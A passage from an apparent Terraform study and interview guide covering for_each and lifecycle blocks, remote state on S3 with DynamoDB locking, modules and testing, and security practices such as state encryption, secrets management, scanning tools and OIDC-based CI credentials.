# State: [0]=alice, [1]=bob, [2]=charlie
# Remove "bob": [1] shifts to charlie, [2] destroyed
# Result: RENAMES bob to charlie, DELETES charlie — WRONG

# for_each approach — stable
resource "aws_iam_user" "team" {
  for_each = toset(var.team)
  name     = each.key
}
# State: ["alice"]=alice, ["bob"]=bob, ["charlie"]=charlie
# Remove "bob": only ["bob"] destroyed — CORRECT
```

### When to Use Each

**Use `count` when:** all instances are truly identical and fungible, conditional resource creation (`count = var.enabled ? 1 : 0`), or simple scaling where index order does not matter.

**Use `for_each` when:** each instance has a distinct identity, instances may be added/removed individually, instances have different configurations, or the key meaningfully identifies what the resource IS.

### Industry Usage

The `count = 0 or 1` pattern is idiomatic for conditional resources:

```hcl
resource "aws_eip" "nat" {
  count  = var.create_nat ? 1 : 0
  domain = "vpc"
}
```

Converting a list to a set for `for_each`:

```hcl
for_each = toset(var.names)                           # From list
for_each = { for s in var.servers : s.name => s }     # From list of objects to map
```

### Important Details

`count` and `for_each` are mutually exclusive on the same resource. `for_each` keys must be known at plan time — computed values cause "cannot be determined until apply" errors. Migrating from `count` to `for_each` requires `terraform state mv` for each resource to map old indexes to new keys.

### Interview Insights

**Q: A colleague says "just always use for_each, never count." Do you agree?**
Mostly, but not entirely. `for_each` is strictly better when instances have distinct identities. But `count` is still appropriate for conditional creation (`count = var.enabled ? 1 : 0`) and truly identical fungible resources.

---

## 5.2 lifecycle Block

### Concept

The `lifecycle` block customizes how Terraform manages creation, update, and destruction of a resource.

### How It Works

**`create_before_destroy`** — creates the new resource before destroying the old one. Essential for zero-downtime replacements of security groups, load balancers, and other resources attached to running infrastructure.

```hcl
resource "aws_security_group" "web" {
  lifecycle { create_before_destroy = true }
}
```

**`prevent_destroy`** — Terraform errors if any plan would destroy this resource. Use on critical resources like production databases, state buckets, and KMS keys.

```hcl
resource "aws_db_instance" "production" {
  lifecycle { prevent_destroy = true }
  deletion_protection = true    # Also protect at AWS API level
}
```

**`ignore_changes`** — prevents Terraform from reverting specific attributes. Use when external systems (autoscaling, deployments) modify attributes that Terraform should not manage.

```hcl
resource "aws_ecs_service" "app" {
  desired_count = 3
  lifecycle {
    ignore_changes = [
      desired_count,        # Auto-scaling changes this
      task_definition,      # CI/CD deployment updates this
    ]
  }
}
```

**`replace_triggered_by`** (Terraform 1.2+) — forces replacement when a referenced resource changes, even if the resource's own config has not changed.

```hcl
resource "aws_eks_node_group" "workers" {
  lifecycle {
    replace_triggered_by = [aws_launch_template.eks_nodes]
    create_before_destroy = true
  }
}
```

### Industry Usage

`prevent_destroy` only protects within Terraform — it does NOT protect against manual deletion via AWS Console or CLI. Always combine with AWS-level protection (`deletion_protection = true` for RDS, `force_destroy = false` for S3).

`ignore_changes = all` makes a resource "create-only" — Terraform creates it but never updates it. Use for ECS services, autoscaling groups, or resources managed by external controllers after initial creation.

### Important Details

`create_before_destroy` propagates through dependencies. If resource A has it and resource B depends on A, B implicitly gets it too. `ignore_changes` creates "silent drift" — Terraform does not track changes to those attributes, which can hide real problems. `replace_triggered_by` is different from `depends_on`: `depends_on` controls ordering, `replace_triggered_by` forces replacement.

---

## 5.3 moved Block — Refactoring Without Destruction

### Concept

The `moved` block (Terraform 1.1+) renames or moves resources in state without destroying and recreating them. It is the declarative, codified alternative to `terraform state mv`.

### How It Works

```hcl
# Rename a resource
moved {
  from = aws_instance.web_server
  to   = aws_instance.web
}

# Move into a module
moved {
  from = aws_instance.web
  to   = module.compute.aws_instance.web
}
```

### Industry Usage

`moved` blocks are preferred over `terraform state mv` because they are committed to Git (PR reviewable), automatically apply to all environments on next plan/apply, and leave a clear audit trail. Keep `moved` blocks until ALL environments have applied, then clean them up in a separate PR.

The `removed` block (Terraform 1.7+) is the declarative way to remove a resource from Terraform management without destroying it:

```hcl
removed {
  from = aws_s3_bucket.legacy_data
  lifecycle { destroy = false }    # Remove from state, preserve real resource
}
```

### Interview Insights

**Q: How do you rename a resource without destroying it?**
Use a `moved` block. It updates the state address without touching the real infrastructure. Before `moved` blocks, you would use `terraform state mv`, but that is imperative and not tracked in Git.

# 6. STATE MANAGEMENT

## 6.1 What State Is and Why It Exists

### Concept

State (`terraform.tfstate`) is a JSON file that maps your configuration to real-world resources. It records every resource's attributes, IDs, and metadata. Without state, Terraform cannot know that `aws_instance.web` in your config corresponds to `i-0a1b2c3d4e5f67890` in AWS.

### Why It Is Used

State serves three critical functions: it maps config to cloud resources (the `web` resource maps to instance `i-0a1b2c3d4e5f67890`), it stores all resource attributes so Terraform can compute diffs without querying every API, and it tracks metadata like dependencies and the serial number (which increments on every write for concurrent modification detection).

### Industry Usage

**State contains plaintext secrets.** Database passwords, API keys, and any value returned by a provider are stored unencrypted in state. This is why state must NEVER be stored in Git, must always be encrypted at rest (S3 SSE-KMS), and access must be controlled via IAM.

The `sensitive = true` flag on variables and outputs only redacts values from CLI output. It does NOT encrypt them in state. This is one of the most important things to understand about Terraform security.

### Interview Insights

**Q: A colleague says `sensitive = true` protects their database password in state. What do you say?**
`sensitive` only redacts CLI output. State is always plaintext JSON. You need KMS encryption on the S3 bucket, IAM policies restricting who can read state, and ideally should minimize storing secrets in state (use SSM Parameter Store or Secrets Manager references instead).

## 6.2 Remote State Backend — S3 + DynamoDB

### Concept

Local state is never acceptable for team or production use. Remote backends store state in a shared location with locking, encryption, and versioning.

### Why Teams NEVER Use Local State

Local state fails in every production scenario: no locking (two engineers apply simultaneously, corrupting state), no versioning (state file deleted or overwritten with no rollback), no encryption (secrets in plaintext on a laptop), no sharing (state exists on one person's machine — bus factor of 1), and no audit trail (no log of who changed state or when). In production, state is always remote from day one.

### How It Works

```hcl
terraform {
  backend "s3" {
    bucket         = "mycompany-terraform-state"
    key            = "prod/networking/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    kms_key_id     = "alias/terraform-state-key"
    dynamodb_table = "terraform-locks"
  }
}
```

S3 provides storage with versioning (rollback to previous state), encryption (SSE-KMS), and access logging. DynamoDB provides state locking (prevents concurrent applies from corrupting state).

### Industry Usage — Full Production Setup

A production-grade remote backend requires all of the following:

**S3 bucket configuration:**

```hcl
resource "aws_s3_bucket" "terraform_state" {
  bucket = "mycompany-terraform-state"

  lifecycle { prevent_destroy = true }
}

resource "aws_s3_bucket_versioning" "terraform_state" {
  bucket = aws_s3_bucket.terraform_state.id
  versioning_configuration { status = "Enabled" }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "terraform_state" {
  bucket = aws_s3_bucket.terraform_state.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.terraform_state.id
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_public_access_block" "terraform_state" {
  bucket                  = aws_s3_bucket.terraform_state.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_policy" "terraform_state" {
  bucket = aws_s3_bucket.terraform_state.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Sid       = "EnforceTLS"
      Effect    = "Deny"
      Principal = "*"
      Action    = "s3:*"
      Resource  = [
        aws_s3_bucket.terraform_state.arn,
        "${aws_s3_bucket.terraform_state.arn}/*"
      ]
      Condition = {
        Bool = { "aws:SecureTransport" = "false" }
      }
    }]
  })
}
```

**DynamoDB locking table:**

```hcl
resource "aws_dynamodb_table" "terraform_locks" {
  name         = "terraform-locks"
  billing_mode = "PAY_PER_REQUEST"
  hash_key     = "LockID"

  attribute {
    name = "LockID"
    type = "S"
  }

  point_in_time_recovery { enabled = true }

  tags = { ManagedBy = "terraform" }
}
```

**KMS key for state encryption:**

```hcl
resource "aws_kms_key" "terraform_state" {
  description             = "KMS key for Terraform state encryption"
  deletion_window_in_days = 30
  enable_key_rotation     = true
}

resource "aws_kms_alias" "terraform_state" {
  name          = "alias/terraform-state-key"
  target_key_id = aws_kms_key.terraform_state.id
}
```

**IAM — separate roles per environment:**

The dev Terraform role can only read/write `dev/*` state paths. The prod role can only access `prod/*`. State bucket IAM policy restricts by path prefix. This prevents a dev pipeline from accidentally reading or writing production state.

**State key convention:**
```
<environment>/<component>/terraform.tfstate
prod/networking/terraform.tfstate
prod/compute/terraform.tfstate
staging/networking/terraform.tfstate
```

### How Remote State Access Is Secured

With SSE-KMS encryption, reading state requires BOTH S3 GetObject permission AND KMS Decrypt permission. All KMS API calls are logged in CloudTrail, providing a complete audit trail of who accessed state. The KMS key policy can further restrict who can decrypt state, independent of S3 permissions.

### Important Details

Backend configuration does NOT support variable interpolation. You cannot write `bucket = var.state_bucket` — backend blocks are evaluated before variables are loaded. Use `-backend-config` flags or partial backend configs for environment-specific values.

```bash
terraform init \
  -backend-config="bucket=mycompany-tf-state" \
  -backend-config="key=prod/networking/terraform.tfstate"
```

The chicken-and-egg problem: the state bucket itself must exist before Terraform can use it as a backend. Teams typically bootstrap the state bucket and DynamoDB table using a separate "bootstrap" Terraform configuration with local state, or create them manually via CloudFormation/CLI as a one-time setup.

---

## 6.3 State Locking

### Concept

State locking prevents concurrent Terraform operations from corrupting the state file. When one apply is running, no other apply can proceed.

### How It Works

When `terraform apply` starts, Terraform writes a lock record to the DynamoDB table using a conditional write (PutItem with condition that the record does not already exist). The lock contains the operation type, who initiated it, and a timestamp. When apply completes, the lock record is deleted.

If another user tries to apply while a lock exists, Terraform shows the lock holder's information and refuses to proceed.

### Industry Usage — Stuck Lock Recovery

The most common real-world scenario: CI/CD pipeline crashes mid-apply (runner dies, timeout, network failure). The lock record remains in DynamoDB but no process is holding it.

```bash
# Step 1: VERIFY no apply is actually running
# Check CI/CD pipeline status, check with team

# Step 2: Force unlock using the Lock ID from the error message
terraform force-unlock LOCK_ID

# Step 3: If force-unlock fails, manually delete from DynamoDB
aws dynamodb delete-item \
  --table-name terraform-locks \
  --key '{"LockID": {"S": "mycompany-terraform-state/prod/networking/terraform.tfstate"}}'
```

**CRITICAL:** Never force-unlock without verifying that no apply is running. If an apply IS running and you force-unlock, another apply can start concurrently, corrupting state.

### Interview Insights

**Q: What happens if state locking fails?**
Terraform refuses to proceed and shows the lock holder's info. If the lock is stale (crashed process), use `terraform force-unlock` with the Lock ID. Always verify no apply is running first.

---

## 6.4 State Commands

### Concept

`terraform state` commands are surgical tools for inspecting and manipulating state.

### Key Commands

```bash
# List all resources in state
terraform state list

# Show full attributes of a specific resource
terraform state show aws_instance.web

# Move/rename a resource in state (no infrastructure change)
terraform state mv aws_instance.web aws_instance.app

# Remove a resource from state (does NOT destroy it)
terraform state rm aws_instance.web

# Download state locally (for backup)
terraform state pull > backup-$(date +%Y%m%d).tfstate

# Upload state to remote (DANGEROUS)
terraform state push backup.tfstate
```

### Industry Usage — Safety Rules

```
BEFORE any state operation:
  1. terraform state pull > backup-$(date +%Y%m%d).tfstate
  2. Verify backup is readable: cat backup-*.tfstate | jq '.serial'
  3. Notify team in Slack/chat

AFTER every state operation:
  1. terraform state list — verify expected resources
  2. terraform plan — verify 0 unexpected changes
  3. If unexpected: restore from backup immediately

NEVER:
  state push -force without verified backup
  state mv without plan after
  Direct JSON editing of state files
```

---

## 6.5 Splitting Large State

### Concept

When a single state file grows beyond 200 resources or 5MB, plan times slow down, blast radius increases, and multiple teams block each other.

### Industry Usage — Splitting Strategy

Split by domain (what resources do), team ownership (who manages them), and rate of change (how often they change):

```
stacks/
├── networking/     # VPC, subnets, routes — changes rarely
├── security/       # IAM roles, security groups, KMS — changes rarely
├── data/           # RDS, ElastiCache, S3 — moderate changes
├── compute/        # EKS, EC2, ASG — changes frequently
└── applications/   # Per-service resources — changes most often
```

Target: 50-200 resources per state file. Below 50 creates unnecessary overhead. Above 200 slows down plans and increases blast radius.

### Cross-Stack References

When splitting state, stacks need to reference each other's outputs. Two patterns:

**`terraform_remote_state`** (tight coupling): reads outputs directly from another state file. Simple but creates a hard dependency on the other state's backend path.

**SSM Parameter Store** (loose coupling, preferred): one stack writes outputs to SSM, another reads from SSM. No direct state file dependency.

```hcl
# Networking stack writes to SSM
resource "aws_ssm_parameter" "vpc_id" {
  name  = "/prod/networking/vpc_id"
  type  = "String"
  value = aws_vpc.main.id
}

# Application stack reads from SSM
data "aws_ssm_parameter" "vpc_id" {
  name = "/prod/networking/vpc_id"
}
```

---

## 6.6 Drift Detection

### Concept

Drift occurs when real infrastructure diverges from the state file — someone manually changed a security group rule, an auto-scaler modified instance counts, or an external process modified a resource.

### How It Works

```bash
# Detect drift: refresh state from real infrastructure
terraform plan -refresh-only

# In CI/CD: detect drift with exit codes
terraform plan -detailed-exitcode -refresh-only
# Exit 0 = no drift
# Exit 2 = drift detected — alert the team
```

### Industry Usage

Production teams detect drift in three ways:

**Scheduled plan jobs:** CI/CD runs `terraform plan -detailed-exitcode` on a schedule (every 6-12 hours). Exit code 2 triggers a Slack/PagerDuty alert.

**PR-based plans:** Every PR runs `terraform plan`, which inherently detects drift as a side effect.

**Dedicated drift tools:** Driftctl, Terraform Cloud drift detection, or AWS Config rules for managed resources.

Drift is handled through manual investigation (who changed what and why?), `terraform apply` to revert unwanted changes, `terraform apply -refresh-only` to accept intentional changes into state, or `ignore_changes` for attributes managed by external systems.

### Important Details — Silent Drift

Silent drift is drift that Terraform cannot detect. Causes include `ignore_changes` hiding attribute modifications, `-refresh=false` skipping API checks, and resources created outside Terraform that are not in state at all (invisible resources).

### Interview Insights

**Q: Your plan shows no changes but a security group rule is missing. How do you investigate?**
Check for `ignore_changes` on the security group. Check if `-refresh=false` was used. Run `terraform plan -refresh-only` to force a state refresh. Check if the rule was created outside Terraform and is not in state. Check AWS CloudTrail for who modified the rule.

---

## 6.7 Workspaces vs Separate Directories

### Concept

Terraform workspaces let you maintain multiple state files from the same configuration. Separate directories provide physical isolation.

### Industry Usage

**Use workspaces for:** ephemeral environments (PR environments, feature branch testing), single-user or small teams with strong discipline, and non-production-critical work.

**Use separate directories for:** persistent production environments (dev, staging, prod). Directories provide physical separation, per-environment access control (IAM), and per-environment configuration that workspaces cannot match.

The fundamental problem with workspaces for production: nothing enforces which code runs against which workspace. A `terraform workspace select prod` followed by an accidental apply with staging variables can have serious consequences.

```
# Preferred structure for production environments
environments/
├── dev/
│   ├── main.tf
│   ├── variables.tf
│   └── terraform.tfvars
├── staging/
│   ├── main.tf
│   ├── variables.tf
│   └── terraform.tfvars
└── prod/
    ├── main.tf
    ├── variables.tf
    └── terraform.tfvars
```

### Interview Insights

**Q: We use workspaces for dev/staging/prod. Is that a good pattern?**
For ephemeral environments it is fine. For persistent environments, push back. The main risk is no enforcement of which config runs against which workspace. Separate directories backed by separate AWS accounts provide true isolation.

# 7. MODULES

---

## 7.1 Module Anatomy and Purpose

### Concept

A module is a container for related Terraform resources. Every configuration is a module (the root module). When you call another directory or registry source, you use a child module. Modules are like functions — they encapsulate logic, accept inputs (variables), and return outputs.

### Why It Is Used

Without modules: copy-paste VPC config for each environment (3 copies to maintain), 500-line main.tf files mixing all concerns, no standard patterns across teams. With modules: define VPC logic once and call it three times, separate concerns into focused units, platform team publishes approved modules.

### How It Works

```
modules/vpc/
├── main.tf           # Resource definitions
├── variables.tf      # Input interface
├── outputs.tf        # Output interface
├── versions.tf       # Provider requirements
└── README.md         # Documentation
```

```hcl
# Calling a module
module "vpc" {
  source      = "./modules/vpc"
  vpc_cidr    = "10.0.0.0/16"
  environment = "prod"
  az_count    = 3
}

# Using module outputs
resource "aws_eks_cluster" "main" {
  vpc_config {
    subnet_ids = module.vpc.private_subnet_ids
  }
}
```

### Industry Usage

Modules enforce organizational standards. A VPC module can enforce that DNS hostnames are enabled, NAT gateways use one-per-AZ in production, and all resources get required tags. Consumers cannot forget these requirements because the module handles them.

### Important Details

Module path changes state addresses — `aws_vpc.main` becomes `module.vpc.aws_vpc.main`. Adding a module wrapper around existing resources requires `moved` blocks. Modules do not have their own state — state is owned by the root module. Deep module nesting (3+ levels) is an anti-pattern.

---

## 7.2 Module Sources and Versioning

### Concept

The `source` argument tells Terraform where to find module code. Versioning controls which version of a module is used.

### Source Types

```hcl
# Local path — no versioning, changes immediately
module "vpc" { source = "./modules/vpc" }

# Terraform Registry — versioned, community modules
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "5.1.0"    # Pin exact version in production
}

# Git repository — versioned via tags/branches
module "vpc" {
  source = "git::https://github.com/myorg/terraform-modules.git//modules/vpc?ref=v2.3.0"
}

# S3 bucket — for air-gapped environments
module "vpc" {
  source = "s3::https://mycompany-modules.s3.amazonaws.com/vpc/v1.0.0.zip"
}
```

### Industry Usage — Versioning Strategy

**Root modules:** pin exact versions (`version = "5.1.0"`). This prevents unexpected changes in production.

**Reusable modules:** use permissive provider constraints (`>= 4.0, < 6.0`). This lets consumers choose their provider version.

**Upgrade workflow:** update version in dev first, run plan to see changes, deploy to staging, test, then promote to production. Never upgrade all environments simultaneously.

### Interview Insights

**Q: How do you handle module versioning?**
Pin exact versions in production root modules. Use semantic versioning for internal modules. Upgrade through the environment pipeline (dev → staging → prod). Review changelogs before upgrading. Use `moved` blocks if the module restructured its resources.

---

## 7.3 Module Composition Patterns

### Concept

Modules can be composed in different patterns: root modules (environment-specific entry points), infrastructure modules (reusable building blocks), and wrapper modules (opinionated compositions).

### Industry Usage — Full Directory Structure

```
terraform/
├── modules/                          # Reusable building blocks
│   ├── vpc/
│   │   ├── main.tf
│   │   ├── variables.tf
│   │   ├── outputs.tf
│   │   ├── versions.tf
│   │   └── README.md
│   ├── eks/
│   ├── rds/
│   └── iam/
├── environments/
│   ├── dev/
│   │   ├── main.tf                   # Calls modules with dev inputs
│   │   ├── variables.tf
│   │   ├── outputs.tf
│   │   ├── versions.tf
│   │   ├── terraform.tfvars          # Dev-specific values
│   │   └── backend.hcl              # Dev backend config
│   ├── staging/
│   │   └── ...
│   └── prod/
│       └── ...
└── .github/workflows/
    └── terraform.yml                 # CI/CD pipeline
```

Platform team maintains the modules. Application teams consume them. Breaking changes in modules are handled through semantic versioning — removing or renaming a variable or output is a major version bump.

### Module Design Best Practices

**Variables should have descriptions and validations:**

```hcl
variable "vpc_cidr" {
  type        = string
  description = "CIDR block for the VPC"
  validation {
    condition     = can(cidrhost(var.vpc_cidr, 0))
    error_message = "Must be a valid CIDR block."
  }
}

variable "environment" {
  type        = string
  description = "Environment name"
  validation {
    condition     = contains(["dev", "staging", "prod"], var.environment)
    error_message = "Must be dev, staging, or prod."
  }
}
```

**Outputs should expose everything callers might need:**

```hcl
output "vpc_id" {
  description = "ID of the created VPC"
  value       = aws_vpc.main.id
}

output "private_subnet_ids" {
  description = "IDs of private subnets"
  value       = aws_subnet.private[*].id
}

output "public_subnet_ids" {
  description = "IDs of public subnets"
  value       = aws_subnet.public[*].id
}

output "nat_gateway_ids" {
  description = "IDs of NAT gateways (empty if disabled)"
  value       = aws_nat_gateway.main[*].id
}
```

**Provider constraints in modules should be permissive:**

```hcl
# modules/vpc/versions.tf
terraform {
  required_version = ">= 1.3.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = ">= 4.0, < 6.0"    # Permissive — let consumers choose
    }
  }
}
```

**Modules should enforce organizational standards internally:**

```hcl
# modules/vpc/main.tf
locals {
  common_tags = merge(var.tags, {
    Environment = var.environment
    ManagedBy   = "terraform"
    Module      = "vpc"
  })
}

resource "aws_vpc" "main" {
  cidr_block           = var.vpc_cidr
  enable_dns_hostnames = true    # Always enabled — organizational standard
  enable_dns_support   = true    # Always enabled — organizational standard

  tags = merge(local.common_tags, { Name = "${var.environment}-vpc" })
}
```

Consumers cannot forget required tags or DNS settings because the module handles them.

---

## 7.4 Testing Strategy

### Concept

Terraform supports multiple levels of testing, forming a pyramid from fast and cheap at the bottom to slow and expensive at the top.

### Testing Pyramid

**Level 1: `terraform fmt` + `terraform validate`** — instant, runs on every commit. Catches syntax errors, invalid block structures, and formatting issues. Requires no cloud credentials.

```bash
terraform fmt -check -recursive
terraform validate
```

**Level 2: Native `terraform test` (1.6+) with mocks** — milliseconds, unit testing logic. Tests variable validations, local computations, and module outputs without creating real infrastructure.

```hcl
# tests/vpc_validation.tftest.hcl
mock_provider "aws" {}

run "invalid_cidr_rejected" {
  command = plan
  variables {
    vpc_cidr    = "not-a-cidr"
    environment = "dev"
  }
  expect_failures = [var.vpc_cidr]
}

run "valid_config_plans" {
  command = plan
  variables {
    vpc_cidr    = "10.0.0.0/16"
    environment = "prod"
    az_count    = 3
  }
  assert {
    condition     = length(aws_subnet.private) == 3
    error_message = "Expected 3 private subnets for az_count=3"
  }
}
```

**Level 3: `terraform test` with real apply** — minutes, integration testing. Creates real infrastructure, validates outputs, then destroys.

```hcl
# tests/vpc_integration.tftest.hcl
run "creates_vpc_successfully" {
  command = apply
  variables {
    vpc_cidr    = "10.99.0.0/16"
    environment = "test"
    az_count    = 2
  }
  assert {
    condition     = output.vpc_id != ""
    error_message = "VPC ID should not be empty"
  }
  assert {
    condition     = length(output.private_subnet_ids) == 2
    error_message = "Expected 2 private subnets"
  }
}
```

**Level 4: Terratest (Go-based)** — minutes, real infrastructure plus connectivity and behavior checks.

```go
func TestVpcModule(t *testing.T) {
    t.Parallel()
    terraformOptions := &terraform.Options{
        TerraformDir: "../modules/vpc",
        Vars: map[string]interface{}{
            "vpc_cidr":    "10.99.0.0/16",
            "environment": "test",
            "az_count":    2,
        },
    }
    defer terraform.Destroy(t, terraformOptions)
    terraform.InitAndApply(t, terraformOptions)

    vpcId := terraform.Output(t, terraformOptions, "vpc_id")
    assert.NotEmpty(t, vpcId)

    // Verify VPC actually exists in AWS
    vpc := aws.GetVpcById(t, vpcId, "us-east-1")
    assert.Equal(t, "10.99.0.0/16", vpc.CidrBlock)
}
```

### Industry Usage

Most production teams run: `fmt` + `validate` on every PR (instant), `terraform test` with mocks for module logic (fast), and `terraform test` with real apply or Terratest for critical modules before release (slower, runs in dedicated test account). The key rule: never run integration tests in production accounts. Use a dedicated test AWS account with auto-cleanup policies.

# 8. SECURITY

---

## 8.1 State Security

### Concept

The state file contains plaintext secrets — database passwords, API keys, TLS certificates, and any attribute returned by a provider. Securing state is non-negotiable.

### Industry Usage — Defense in Depth

**Encryption at rest:** Use SSE-KMS (not SSE-S3) for the state bucket. SSE-KMS requires both S3 read permission AND KMS Decrypt permission to read state, all KMS API calls are logged in CloudTrail, and key policy can further restrict who can decrypt.

```hcl
terraform {
  backend "s3" {
    bucket     = "mycompany-terraform-state"
    key        = "prod/terraform.tfstate"
    region     = "us-east-1"
    encrypt    = true
    kms_key_id = "alias/terraform-state-key"
  }
}
```

**Encryption in transit:** S3 bucket policy enforcing `aws:SecureTransport` ensures all state transfers use HTTPS.

**Access control:** Separate IAM roles per environment. Dev Terraform role can read/write dev state path only. Prod Terraform role has prod state path only. No cross-environment state access.

**Audit logging:** S3 access logging and CloudTrail for KMS operations provide a full audit trail of who read or modified state.

### Important Details

`sensitive = true` on variables and outputs only redacts CLI output. State is ALWAYS plaintext JSON. Secrets Manager or SSM Parameter Store should be used for sensitive values, with Terraform only storing the ARN/name reference, not the actual secret value.

---

## 8.2 Secrets Management

### Concept

Secrets should never appear in Terraform code, state, or Git. Use AWS Secrets Manager or SSM Parameter Store to manage secrets, and reference them in Terraform.

### Industry Usage

```hcl
# Pattern 1: Read secret from Secrets Manager
data "aws_secretsmanager_secret_version" "db_password" {
  secret_id = "prod/db/password"
}

resource "aws_db_instance" "main" {
  password = data.aws_secretsmanager_secret_version.db_password.secret_string
  # The password IS still in state (Terraform records all attributes)
  # But it is not in code or Git
}

# Pattern 2: Let RDS generate the password, store in Secrets Manager
resource "random_password" "db" {
  length  = 32
  special = true
}

resource "aws_secretsmanager_secret" "db_password" {
  name = "prod/db/password"
}

resource "aws_secretsmanager_secret_version" "db_password" {
  secret_id     = aws_secretsmanager_secret.db_password.id
  secret_string = random_password.db.result
}

resource "aws_db_instance" "main" {
  password = random_password.db.result
}
```

### Secret Commit Recovery

If secrets are accidentally committed to Git:

```bash
# Step 1: ROTATE THE SECRET IMMEDIATELY (before cleaning Git)
# The secret must be considered compromised

# Step 2: Clean Git history
# Use BFG Repo-Cleaner (faster than git filter-branch)
bfg --delete-files "*.tfvars" --delete-files "*.tfstate"
git push --force

# Step 3: Prevent recurrence with pre-commit hooks
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    hooks:
      - id: gitleaks
```

**CRITICAL:** Always rotate the secret FIRST, then clean Git history. The secret is compromised the moment it was pushed.

## 8.3 IAM Least Privilege

### Concept

Terraform execution roles should have the minimum permissions necessary for their function.

### Industry Usage

Separate roles for plan (read-only) and apply (write):

```hcl
# Plan role — read-only + state read
resource "aws_iam_role" "terraform_plan" {
  name = "TerraformRole-Prod-Plan"
  # Permissions: read-only AWS APIs + S3 GetObject (state read)
}

# Apply role — full permissions + state write
resource "aws_iam_role" "terraform_apply" {
  name = "TerraformRole-Prod-Apply"
  # Permissions: full resource management + S3 PutObject (state write)
  # Trust: main branch only (via OIDC conditions)
}
```

### Important Details

IAM policies for Terraform should be scoped by service, not `*`. Tag-based conditions can further restrict which resources Terraform can manage. For multi-account setups, use `external_id` in cross-account trust policies to prevent confused deputy attacks.

---

## 8.4 SAST Tools — Security Scanning

### Concept

Static analysis tools scan `.tf` files for security misconfigurations before `terraform apply` runs.

### Industry Usage

**tflint:** linter that catches syntax errors, invalid provider arguments (wrong instance type names), deprecated arguments, and naming convention violations. Run on every commit.

```bash
# Install and configure tflint
cat > .tflint.hcl << 'EOF'
plugin "aws" {
  enabled = true
  version = "0.27.0"
  source  = "github.com/terraform-linters/tflint-ruleset-aws"
}

rule "terraform_documented_variables" { enabled = true }
rule "terraform_naming_convention" { enabled = true; format = "snake_case" }
rule "aws_instance_invalid_type" { enabled = true }
EOF

tflint --init
tflint --format=compact
```

What tflint catches: invalid instance types (`"t2.micr"` typo), deprecated arguments, missing variable descriptions, naming convention violations, required tag policies.

**tfsec:** security scanner for misconfigurations — open security groups, unencrypted S3 buckets, missing deletion protection. Fast and Terraform-native.

```bash
tfsec . --minimum-severity HIGH
tfsec . --format sarif > tfsec-results.sarif    # For GitHub Security tab
```

**checkov:** compliance scanner covering CIS benchmarks, SOC2, HIPAA. Supports multiple IaC frameworks (Terraform, CloudFormation, Kubernetes, Helm).

```bash
checkov -d . --framework terraform
checkov -d . --check CKV_AWS_18,CKV_AWS_20    # Specific checks only
```

**terrascan:** policy-as-code using OPA/Rego. For custom organizational policies that tfsec/checkov cannot express.

```yaml
# CI/CD pipeline order — fail fast
# .github/workflows/terraform-security.yml
jobs:
  security-scan:
    steps:
      # Step 1: tflint — syntax and provider validation
      - run: tflint --init && tflint --format=compact

      # Step 2: tfsec — security scanning
      - uses: aquasecurity/tfsec-action@v1.0.0
        with:
          minimum_severity: HIGH
          soft_fail: false    # Fail PR on HIGH findings

      # Step 3: checkov — compliance scanning
      - uses: bridgecrewio/checkov-action@master
        with:
          directory: .
          framework: terraform
          soft_fail: false

      # Step 4: Upload results to GitHub Security tab
      - uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: reports/results.sarif
```

```hcl
# Suppress specific checks with inline comments when intentional
resource "aws_s3_bucket" "public_assets" {
  #tfsec:ignore:aws-s3-block-public-acls  # Intentionally public — serves static assets
  #checkov:skip=CKV_AWS_20:Public bucket for static assets
  bucket = "myapp-public-assets"
}
```

### Decision: Which Tool When

Use tflint first (fast, catches syntax before security tools). Use tfsec for Terraform-specific security scanning (most teams' default). Use checkov when you need multi-framework scanning or specific compliance frameworks (CIS, NIST, SOC2). Use terrascan for custom Rego policies and enterprise policy governance.

---

## 8.5 OIDC Authentication — Eliminating Stored Credentials

### Concept

OIDC (OpenID Connect) eliminates static AWS credentials from CI/CD entirely. GitHub Actions (or GitLab CI) issues a short-lived JWT token. The AWS provider exchanges this token for temporary credentials via `sts:AssumeRoleWithWebIdentity`.

### How It Works

```hcl
# Step 1: Create OIDC identity provider in AWS
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}

# Step 2: Create IAM role with trust policy
resource "aws_iam_role" "terraform_apply" {
  name = "TerraformRole-Prod-Apply"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Principal = {
        Federated = aws_iam_openid_connect_provider.github.arn
      }
      Action = "sts:AssumeRoleWithWebIdentity"
      Condition = {
        StringEquals = {
          "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
        }
        StringLike = {
          # RESTRICT to specific repo + main branch only
          "token.actions.githubusercontent.com:sub" =
            "repo:myorg/infra-repo:ref:refs/heads/main"
        }
      }
    }]
  })
}
```

```yaml
# Step 3: GitHub Actions workflow uses OIDC
permissions:
  id-token: write    # REQUIRED for OIDC
  contents: read

steps:
  - name: Configure AWS credentials via OIDC
    uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/TerraformRole-Prod-Apply
      aws-region: us-east-1
      # No access_key_id or secret_access_key — pure OIDC
```

### Industry Usage — Plan vs Apply Role Separation

```hcl
# Plan role — read-only, any branch can trigger
# Trust: "repo:myorg/infra-repo:pull_request"
# Permissions: read-only AWS APIs + S3 GetObject (state read)

# Apply role — write, main branch only
# Trust: "repo:myorg/infra-repo:ref:refs/heads/main"
# Permissions: full resource management + S3 PutObject (state write)
```

No credentials are stored anywhere. The CI platform's private signing key is the only secret. Credentials expire automatically after the session (typically 1 hour).

# 9. CI/CD USAGE

---

## 9.1 Pipeline Architecture

### Concept

